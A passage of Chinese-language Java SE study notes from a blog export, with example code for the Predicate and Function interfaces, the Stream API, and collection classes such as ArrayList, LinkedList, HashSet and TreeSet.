class="line">        consumer1.accept(age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="3-3-Predicate"><a href="#3-3-Predicate" class="headerlink" title="3.3 Predicate"></a>3.3 Predicate</h5><ul>
<li>用于判断参数是否满足指定的条件</li>
<li>boolean test(T,t)：对给定参数进行判断，返回boolean值</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> b=checkString(<span class="string">&quot;hello&quot;</span>,s -&gt; s.length()&gt;<span class="number">6</span>);</span><br><span class="line">    System.out.println(b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkString</span><span class="params">(String str, Predicate&lt;String&gt; predicate)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> predicate.test(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>negate()</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//negate()对结果进行逻辑非操作</span></span><br><span class="line"><span class="keyword">return</span> predicate.negate().test(str);</span><br></pre></td></tr></table></figure>

<ul>
<li>短路与and，短路或or</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> hello = checkString(<span class="string">&quot;hello&quot;</span>, s -&gt; s.length() &gt; <span class="number">7</span>, s -&gt; s.length() &lt; <span class="number">6</span>);</span><br><span class="line">    System.out.println(hello);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对同一个字符串给出俩个不同的判断条件，最后把这个俩个判断结果合成</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkString</span><span class="params">(String str, Predicate&lt;String&gt; predicate,Predicate&lt;String&gt; predicate1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> b1=predicate.test(str);</span><br><span class="line">    <span class="keyword">boolean</span> b2=predicate1.test(str);</span><br><span class="line"> <span class="comment">//        return b1 &amp;&amp; b2;</span></span><br><span class="line">    <span class="comment">//短路与</span></span><br><span class="line">    <span class="keyword">return</span> predicate.and(predicate1).test(str);</span><br><span class="line">    <span class="comment">//短路或</span></span><br><span class="line">    <span class="keyword">return</span> predicate.or(predicate1).test(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>应用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> *      给定姓名+年龄的字符串数组</span></span><br><span class="line"><span class="comment"> *      - 查找出同时符合: 年龄&gt;35,姓名长度&gt;2的数组集合</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PredicateTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] strArray=&#123;<span class="string">&quot;林青霞,30&quot;</span>,<span class="string">&quot;凉凉,20&quot;</span>,<span class="string">&quot;张曼玉,42&quot;</span>&#125;;</span><br><span class="line">        ArrayList&lt;String&gt; list=myFilter(strArray,s -&gt; s.split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>].length()&gt;<span class="number">2</span>,</span><br><span class="line">                                        s -&gt; Integer.parseInt(s.split(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>])&gt;<span class="number">34</span>);</span><br><span class="line">        System.out.println(list.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;String&gt; <span class="title">myFilter</span><span class="params">(String[] strArray, Predicate&lt;String&gt;predicate</span></span></span><br><span class="line"><span class="function"><span class="params">                                         ,Predicate&lt;String&gt; predicate1)</span></span>&#123;</span><br><span class="line">        ArrayList&lt;String&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String str:strArray)&#123;</span><br><span class="line">            <span class="keyword">if</span> (predicate.and(predicate1).test(str))&#123;</span><br><span class="line">                list.add(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="3-4-function"><a href="#3-4-function" class="headerlink" title="3.4  function"></a>3.4  function</h5><blockquote>
<p>interface Function&lt; T,R&gt; </p>
<p>R apply(T,t) </p>
<p>default <V> Function&lt;T, V&gt; andThen(Function&lt;? super R, ? extends V&gt; after)  组合</p>
</blockquote>
<ul>
<li>用于对参数用于<strong>对参数进行处理</strong>，转换(处理逻辑由Lambda表达式实现)，然后<strong>返回一个新的值</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        convert(<span class="string">&quot;444&quot;</span>,s -&gt; Integer.parseInt(s));</span><br><span class="line">        convert1(<span class="number">444</span>,integer -&gt; String.valueOf(integer+<span class="number">100</span>));</span><br><span class="line"></span><br><span class="line">        convert2(<span class="string">&quot;444&quot;</span>,s -&gt; Integer.parseInt(s),integer -&gt; String.valueOf(integer+<span class="number">200</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个方法，将一个字符串转换为int类型</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">convert</span><span class="params">(String str, Function&lt;String,Integer&gt; fun)</span></span>&#123;</span><br><span class="line">        Integer apply = fun.apply(str);</span><br><span class="line">        System.out.println(apply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个方法，将一个int类型转换为String类型</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">convert1</span><span class="params">(<span class="keyword">int</span> i,Function&lt;Integer, String&gt; fun1)</span></span>&#123;</span><br><span class="line">        String app=fun1.apply(i);</span><br><span class="line">        System.out.println(app);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//组合</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">convert2</span><span class="params">(String str,Function&lt;String, Integer&gt; fun1,Function&lt;Integer,String&gt; fun2)</span></span>&#123;</span><br><span class="line"><span class="comment">//        Integer i = fun1.apply(str);</span></span><br><span class="line"><span class="comment">//        String s = fun2.apply(i);</span></span><br><span class="line">        String s = fun1.andThen(fun2).apply(str);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>应用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    String str=<span class="string">&quot;林青霞,30&quot;</span>;</span><br><span class="line">    convert(str,s-&gt;s.split(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>], Integer::parseInt, integer -&gt; String.valueOf(integer+<span class="number">70</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">convert</span><span class="params">(String s, Function&lt;String,String&gt; fun1, Function&lt;String,Integer&gt; fun2,</span></span></span><br><span class="line"><span class="function"><span class="params">                           Function&lt;Integer, String&gt; fun3)</span></span>&#123;</span><br><span class="line">		String apply = fun1.andThen(fun2).andThen(fun3).apply(s);</span><br><span class="line">        System.out.println(apply);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="五、Stream流"><a href="#五、Stream流" class="headerlink" title="五、Stream流"></a>五、Stream流</h3><blockquote>
<p>使用：生成流<code>list.stream()</code>–&gt;中间操作<code>filter()-</code>-&gt;终结操作<code>foreach()</code></p>
</blockquote>
<h4 id="1、演示"><a href="#1、演示" class="headerlink" title="1、演示"></a>1、演示</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; arrayList=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">arrayList.add(<span class="string">&quot;林青霞&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;张曼玉&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;王祖贤&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;柳岩&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;张敏&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;张无忌&quot;</span>);</span><br><span class="line"></span><br><span class="line">ArrayList&lt;String&gt; zhangList=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (String s1:arrayList) &#123;</span><br><span class="line">    <span class="keyword">if</span> (s1.startsWith(<span class="string">&quot;张&quot;</span>))&#123;</span><br><span class="line">        zhangList.add(s1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ArrayList&lt;String&gt; threeList=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (String s2:zhangList)&#123;</span><br><span class="line">    <span class="keyword">if</span> (s2.length()&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        threeList.add(s2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (String s3:threeList) &#123;</span><br><span class="line">    System.out.println(s3);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;----------------&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用Stream流形式</span></span><br><span class="line">arrayList.stream().filter(s -&gt; s.startsWith(<span class="string">&quot;张&quot;</span>)).filter(s -&gt; s.length()&gt;<span class="number">2</span>).forEach(System.out::println);</span><br></pre></td></tr></table></figure>

<h4 id="2、Stream生成方式"><a href="#2、Stream生成方式" class="headerlink" title="2、Stream生成方式"></a>2、Stream生成方式</h4><h5 id="2-1-Collection体系"><a href="#2-1-Collection体系" class="headerlink" title="2.1 Collection体系"></a>2.1 Collection体系</h5><blockquote>
<p>list.stream()</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Collection体系</span></span><br><span class="line">List&lt;String&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">Stream&lt;String&gt; listStream = list.stream();</span><br><span class="line"></span><br><span class="line">Set&lt;String&gt; set=<span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">Stream&lt;String&gt; setStream = set.stream();</span><br></pre></td></tr></table></figure>



<h5 id="2-2-Map体系"><a href="#2-2-Map体系" class="headerlink" title="2.2 Map体系"></a>2.2 Map体系</h5><blockquote>
<p>keySet()–&gt;key</p>
<p>values()–value</p>
<p>entrySet()–&gt; key-value</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Map体系</span></span><br><span class="line">Map&lt;String,Integer&gt; map=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">Stream&lt;String&gt; mapStream = map.keySet().stream();</span><br><span class="line">Stream&lt;Integer&gt; values = map.values().stream();</span><br><span class="line">Stream&lt;Map.Entry&lt;String, Integer&gt;&gt; mapEntryStream = map.entrySet().stream();</span><br></pre></td></tr></table></figure>



<h5 id="2-3-数组"><a href="#2-3-数组" class="headerlink" title="2.3 数组"></a>2.3 数组</h5><blockquote>
<p>Stream.of(array)</p>
<p>Arrays.stream(arr[] arr)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组</span></span><br><span class="line">String[] arr=&#123;<span class="string">&quot;sss&quot;</span>,<span class="string">&quot;dsfs&quot;</span>&#125;;</span><br><span class="line">Stream&lt;String&gt; arrStream = Stream.of(arr);</span><br><span class="line">Stream&lt;String&gt; arrStream2 = Stream.of(<span class="string">&quot;sss&quot;</span>, <span class="string">&quot;dsfs&quot;</span>);</span><br><span class="line">Stream&lt;Integer&gt; integerStream = Stream.of(<span class="number">19</span>, <span class="number">23</span>);</span><br></pre></td></tr></table></figure>



<h4 id="3、Stream中间操作"><a href="#3、Stream中间操作" class="headerlink" title="3、Stream中间操作"></a>3、Stream中间操作</h4><ul>
<li>filter(Predicate predicate) 对流中的数据进行过滤</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">arrayList.stream().filter(s -&gt; s.startsWith(<span class="string">&quot;张&quot;</span>)).forEach(System.out::print);</span><br></pre></td></tr></table></figure>

<ul>
<li>limit(long maxSize) 返回流中元素组成的流，<strong>截取前指定参数个数</strong>的数据</li>
<li>skip(long n)   跳过指定参数个数的数据，返回由该流<strong>剩余元素</strong>组成的流</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">arrayList.stream().limit(<span class="number">3</span>).forEach(System.out::println);</span><br><span class="line">System.out.println(<span class="string">&quot;---------------&quot;</span>);</span><br><span class="line">arrayList.stream().skip(<span class="number">4</span>).forEach(System.out::println);</span><br></pre></td></tr></table></figure>

<ul>
<li>concat(Stream a,Stream b) 合并俩个流，<strong>静态方法，由接口名调用</strong></li>
<li>distinct() 返回该流不同元素组成的流</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取出前4个元素</span></span><br><span class="line">Stream&lt;String&gt;  s1= arrayList.stream().limit(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//跳过2个元素</span></span><br><span class="line">Stream&lt;String&gt; s2 = arrayList.stream().skip(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//合并俩个流</span></span><br><span class="line">Stream.concat(s1, s2).forEach(System.out::println);;</span><br><span class="line">System.out.println(<span class="string">&quot;---------------&quot;</span>);</span><br><span class="line"><span class="comment">//取出流中不同元素</span></span><br><span class="line">Stream.concat(s1, s2).distinct().forEach(System.out::println);</span><br></pre></td></tr></table></figure>

<ul>
<li>sorted() 返回排序的流</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">arrayList.stream().sorted().forEach(System.out::println);</span><br><span class="line">System.out.println(<span class="string">&quot;--------------&quot;</span>);</span><br><span class="line"><span class="comment">//按照长度排序</span></span><br><span class="line">arrayList.stream().sorted((s1,s2)-&gt;s1.length()-s2.length()).forEach(System.out::println);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>map(Function mapper)   返回由给定函数应用于该流元素的结果组成的流</strong></li>
<li>IntStream <strong>mapToint</strong>(ToIntFunction mapper) 返回一个<strong>IntStream</strong>，其中包含将给定函数应用于此流的元素的<strong>结果</strong><ul>
<li>IntStream 原始的int流</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">arrayList.stream().map(Integer::parseInt).forEach(System.out::println);</span><br><span class="line">System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> sum = arrayList.stream().mapToInt(Integer::parseInt).sum();</span><br><span class="line">System.out.println(sum);</span><br></pre></td></tr></table></figure>



<h4 id="4、Stream终结操作"><a href="#4、Stream终结操作" class="headerlink" title="4、Stream终结操作"></a>4、Stream终结操作</h4><ul>
<li><p>foreach(Consumer action)</p>
</li>
<li><p>long count()  返回流的元素数</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> c = arrayList.stream().filter(s -&gt; s.startsWith(<span class="string">&quot;张&quot;</span>)).count();</span><br><span class="line">System.out.println(c);</span><br></pre></td></tr></table></figure>



<h4 id="5、练习"><a href="#5、练习" class="headerlink" title="5、练习"></a>5、练习</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; arrayList=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">arrayList.add(<span class="string">&quot;林青霞&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;张曼玉&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;王祖贤&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;柳岩&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;张敏&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;张无忌&quot;</span>);</span><br><span class="line"></span><br><span class="line">ArrayList&lt;String&gt; arrayList2=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">arrayList2.add(<span class="string">&quot;重监控&quot;</span>);</span><br><span class="line">arrayList2.add(<span class="string">&quot;杀杀杀&quot;</span>);</span><br><span class="line">arrayList2.add(<span class="string">&quot;搜索&quot;</span>);</span><br><span class="line">arrayList2.add(<span class="string">&quot;啊啊&quot;</span>);</span><br><span class="line">arrayList2.add(<span class="string">&quot;撒法发&quot;</span>);</span><br><span class="line">arrayList2.add(<span class="string">&quot;实施方案&quot;</span>);</span><br><span class="line"></span><br><span class="line">Stream&lt;String&gt; stream1 = arrayList.stream().filter(s -&gt; s.startsWith(<span class="string">&quot;林&quot;</span>)).skip(<span class="number">1</span>);</span><br><span class="line">Stream&lt;String&gt; stream2 = arrayList2.stream().filter(s -&gt; s.length() &gt; <span class="number">2</span>).limit(<span class="number">3</span>);</span><br><span class="line">Stream&lt;String&gt; allStream = Stream.concat(stream1, stream2);</span><br><span class="line"><span class="comment">//        allStream.map(Actor::new).forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回由  给定函数应用于该流元素的结果 组成的流</span></span><br><span class="line">allStream.map(Actor::<span class="keyword">new</span>).forEach(s-&gt; System.out.println(s.getName()));</span><br></pre></td></tr></table></figure>



<h4 id="6、Stream的收集操作"><a href="#6、Stream的收集操作" class="headerlink" title="6、Stream的收集操作"></a>6、Stream的收集操作</h4><ul>
<li>R collect(Collectors collector)  收集方法的参数是一个Collector接口</li>
<li>工具类<code>Collectors</code>提供具体的收集方式<ul>
<li>toLIst()</li>
<li>toSet ()</li>
<li>toMap()</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = arrayList.stream().filter(s -&gt; s.length() &gt; <span class="number">2</span>).collect(Collectors.toList());</span><br><span class="line"><span class="keyword">for</span> (String s:list)&#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>集合</title>
    <url>/2020/11/11/11%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><blockquote>
<p><strong>一组存放多个对象的可变字符序列</strong></p>
</blockquote>
<blockquote>
<p>JDK8:底层全部采用<strong>数组+链表+红黑树</strong>进行维护</p>
<p>​         当索引位置上的链表元素的数据个数&gt;8 且数组的长度&gt;64时，索引上的数据用红黑树存储</p>
<p> 优点：提高查找效率（类似于二分查找）</p>
</blockquote>
<h3 id="一、List"><a href="#一、List" class="headerlink" title="一、List"></a>一、List</h3><h4 id="1、Arrayslist"><a href="#1、Arrayslist" class="headerlink" title="1、Arrayslist"></a>1、Arrayslist</h4><blockquote>
<p><strong>有序可重复</strong>（下标从0开始）</p>
</blockquote>
<p>默认情况为0的空数组对象，有参构造时，创建一个大小为传递大小的对象数组</p>
<p>add()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List list=<span class="keyword">new</span> ArrayList();</span><br><span class="line">List list1=<span class="keyword">new</span> ArrayList();</span><br><span class="line">list.add(<span class="keyword">new</span> Student());</span><br><span class="line">list.add(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line">list.add(<span class="number">123</span>);  <span class="comment">//自动装箱</span></span><br><span class="line"><span class="comment">//插入，后面元素后移</span></span><br><span class="line">list.add(<span class="number">0</span>,<span class="string">&quot;ss&quot;</span>);</span><br><span class="line">list1.add(<span class="string">&quot;故&quot;</span>);</span><br><span class="line"></span><br><span class="line">list.add(list1);        <span class="comment">//将数组2加到数组1中</span></span><br><span class="line"><span class="comment">//以ArrayList形式打印出来</span></span><br><span class="line">System.out.println(list);</span><br></pre></td></tr></table></figure>

<p>size()长度</p>
<p><code>System.out.println(list.size());</code></p>
<p>get(index) 返回Object类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=(String)list.get(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> i=(<span class="keyword">int</span>)list.get(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>contain();返回Boolean类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(list.contains(<span class="string">&quot;hh&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>remove()；移除</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.remove(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line">list.remove(<span class="number">0</span>);<span class="comment">//直接用索引删除</span></span><br><span class="line">System.out.println(list.contains(<span class="string">&quot;hh&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>clear();清空</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//清空</span></span><br><span class="line">list.clear();</span><br><span class="line">System.out.println(list.size());</span><br></pre></td></tr></table></figure>

<p> set():原有元素被覆盖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.set(<span class="number">0</span>,<span class="string">&quot;55&quot;</span>); <span class="comment">//原有元素被覆盖</span></span><br></pre></td></tr></table></figure>

<p>逆向遍历</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ListIterator list2&#x3D;list.listIterator();</span><br><span class="line">while(list2.hasPrevious())&#123;</span><br><span class="line">    System.out.println(list2.previous());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sublist() 截取元素返回一个新的集合</p>
<h4 id="2、LinkedList"><a href="#2、LinkedList" class="headerlink" title="2、LinkedList"></a>2、LinkedList</h4><blockquote>
<p><strong>双向链表</strong>的一个数据结构</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedList list=<span class="keyword">new</span> LinkedList();</span><br><span class="line">list.add(<span class="number">0</span>,<span class="string">&quot;66&quot;</span>);</span><br><span class="line">list.add(<span class="number">1</span>,<span class="string">&quot;55&quot;</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(Object obj:list)&#123;</span><br><span class="line">    System.out.println(obj);</span><br><span class="line">&#125;</span><br><span class="line">list.offer(<span class="string">&quot;后面添加&quot;</span>);</span><br><span class="line">list.push(<span class="string">&quot;前面添加&quot;</span>);</span><br><span class="line">Object o=list.peek(); <span class="comment">//获取集合的第一个元素</span></span><br><span class="line">Object o1=list.peekFirst();</span><br><span class="line">System.out.println(o);</span><br><span class="line">System.out.println(list);</span><br><span class="line"></span><br><span class="line">Iterator iterator=list.iterator();</span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">    String i= (String) iterator.next();</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//去除</span></span><br><span class="line">list.remove(<span class="string">&quot;66&quot;</span>);</span><br><span class="line">System.out.println(list);</span><br></pre></td></tr></table></figure>

<p>以队列的形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.offer(<span class="string">&quot;后面添加&quot;</span>);</span><br><span class="line">list.poll();</span><br></pre></td></tr></table></figure>

<p>以栈的形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.push(<span class="string">&quot;前面添加&quot;</span>);</span><br><span class="line">list.pop();</span><br><span class="line">System.out.println(list);</span><br></pre></td></tr></table></figure>



<h4 id="3、排序方法"><a href="#3、排序方法" class="headerlink" title="3、排序方法"></a>3、排序方法</h4><ul>
<li>将list放在<code>TreeSet</code>当中进行排序，根据排序顺序放置在list集合当中</li>
<li>list转化为数组，利用数组排序规则进行排序 Arrays.sort</li>
<li>使用集合工具类Collections的sort进行排序 Collections.sort        </li>
</ul>
<h3 id="二、Set"><a href="#二、Set" class="headerlink" title="二、Set"></a>二、Set</h3><blockquote>
<p><strong>无序不可重复</strong></p>
</blockquote>
<h4 id="1、HashSet"><a href="#1、HashSet" class="headerlink" title="1、HashSet"></a>1、HashSet</h4><blockquote>
<p><strong>利用Object类的<code>hashcode</code>方法来确定存储位置</strong></p>
<ul>
<li><p>若是该位置无其他元素，直接存入。</p>
</li>
<li><p>若是该位置有其他元素，调用equals()方法，比较相等则舍弃该对象；不相等则覆盖原有对象</p>
</li>
</ul>
<p>重写hash code()与equals()可解决实例对象不同（但内容相同）——&gt;重复</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set set=<span class="keyword">new</span> HashSet();</span><br><span class="line">set.add(<span class="string">&quot;北京&quot;</span>);</span><br><span class="line">set.add(<span class="string">&quot;广州&quot;</span>);</span><br><span class="line">set.add(<span class="string">&quot;上海&quot;</span>);</span><br><span class="line">set.add(<span class="string">&quot;北京&quot;</span>);</span><br><span class="line">System.out.println(set);</span><br><span class="line"><span class="keyword">for</span>(Object obj:set)&#123;</span><br><span class="line">    System.out.println(obj);</span><br><span class="line">&#125;</span><br><span class="line">控制台：[广州, 上海, 北京]</span><br></pre></td></tr></table></figure>



<h4 id="2、LinkedSet"><a href="#2、LinkedSet" class="headerlink" title="2、LinkedSet"></a>2、LinkedSet</h4><p>其实上是<code>HashSet</code>的子类，本质也是通过<code>hashCode</code>来决定元素的位置多提供一个双向链表进行维护次序，</p>
<h4 id="3、TreeSet"><a href="#3、TreeSet" class="headerlink" title="3、TreeSet"></a>3、TreeSet</h4><blockquote>
<p>底层二叉树（红黑树）（左小右大）</p>
</blockquote>
<h5 id="排序方法"><a href="#排序方法" class="headerlink" title="排序方法"></a><strong>排序方法</strong></h5><ul>
<li><code>comparable</code>接口实际上是出自<code>java.lang</code>包,它有一个<code>compareTo(Object obj)</code>方法用来排序</li>
<li><code>comparator</code>接口实际上是出自<code>java.util</code>包,它有一个<code>compare(Object obj1, Object obj2)</code>方法用来排序</li>
</ul>
<blockquote>
<p>Comparable &amp; Comparator 都是用来实现集合中元素的比较、排序的，</p>
<p>只是 Comparable 是在<strong>集合内部</strong>定义的方法实现的排序，Comparator 是在<strong>集合外部</strong>实现的排序</p>
<p>所以，如想实现排序，就需要在集合外定义 Comparator 接口的方法或在集合内实现 Comparable 接口的方法。</p>
<p> String、Integer 自己就可以完成比较大小操作，已经实现了Comparable接口</p>
</blockquote>
<h6 id="1、自然排序"><a href="#1、自然排序" class="headerlink" title="1、自然排序"></a>1、自然排序</h6><ul>
<li>具有自然排序规则的数据(默认调用<code>comparable</code>接口</li>
<li>不具备会出现类型转换异常，需要重写<code>compareTo()</code>方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Comparable</span></span>&#123;</span><br><span class="line"> <span class="comment">//多个排序规则排序</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        Person p=(Person) o;</span><br><span class="line"><span class="comment">//      System.out.println(this.name+&quot;compare&quot;+p.name);</span></span><br><span class="line">        <span class="comment">//按照姓名长度来排序</span></span><br><span class="line">        <span class="keyword">int</span> num=<span class="keyword">this</span>.name.length()-p.name.length();</span><br><span class="line">        <span class="comment">//根据字典来排序</span></span><br><span class="line">        <span class="keyword">int</span> num1=(num==<span class="number">0</span>)?(<span class="keyword">this</span>.name.compareTo(p.name)):num;</span><br><span class="line">        <span class="comment">//长度一致，姓名一致</span></span><br><span class="line">        <span class="keyword">int</span> num2=num1==<span class="number">0</span>? <span class="keyword">this</span>.age-p.age:num1;</span><br><span class="line">        <span class="keyword">return</span> num2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">TreeSet ts1=<span class="keyword">new</span> TreeSet();</span><br><span class="line">Person p=<span class="keyword">new</span> Person(<span class="number">15</span>,<span class="string">&quot;numm&quot;</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">Person p1=<span class="keyword">new</span> Person(<span class="number">16</span>,<span class="string">&quot;aew&quot;</span>,<span class="string">&#x27;女&#x27;</span>);</span><br><span class="line">Person p2=<span class="keyword">new</span> Person(<span class="number">22</span>,<span class="string">&quot;sss&quot;</span>,<span class="string">&#x27;女&#x27;</span>);</span><br><span class="line">Person p3=<span class="keyword">new</span> Person(<span 